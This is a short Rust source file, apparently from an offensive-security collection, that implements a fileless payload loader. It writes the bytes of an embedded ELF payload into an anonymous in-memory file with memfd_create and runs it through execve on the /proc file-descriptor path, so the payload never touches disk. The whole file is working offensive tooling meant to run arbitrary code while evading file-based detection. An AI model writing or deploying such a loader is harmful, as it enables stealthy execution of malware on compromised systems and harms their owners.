// Credit to https://github.com/trickster0/OffensiveRust
mod payload;
use crate::payload::get_payload;

use libc::{
    c_char,
    execve,
    getpid,
    memfd_create,
    write
};
use std::ffi::CString;

fn main() {
    let rs_name: &str = "foo";
    let c_str = CString::new(rs_name).unwrap();
    let c_name = c_str.as_ptr() as *const c_char;
    let elf = get_payload();

    unsafe {
        let c_elf = elf.as_ptr();
        // Create temporary file
        let fd = memfd_create(c_name, 0);
        let pid = getpid();

        // Write downloaded bytes to temporary file
        write(fd, c_elf as _, elf.len());

        let path = format!("/proc/{}/fd/{}", pid, fd);
        let cs_path = CString::new(path).unwrap();
        let c_path = cs_path.as_ptr() as *const c_char;

        // Execute ELF from memory
        execve(c_path, std::ptr::null(), std::ptr::null());
    }
}
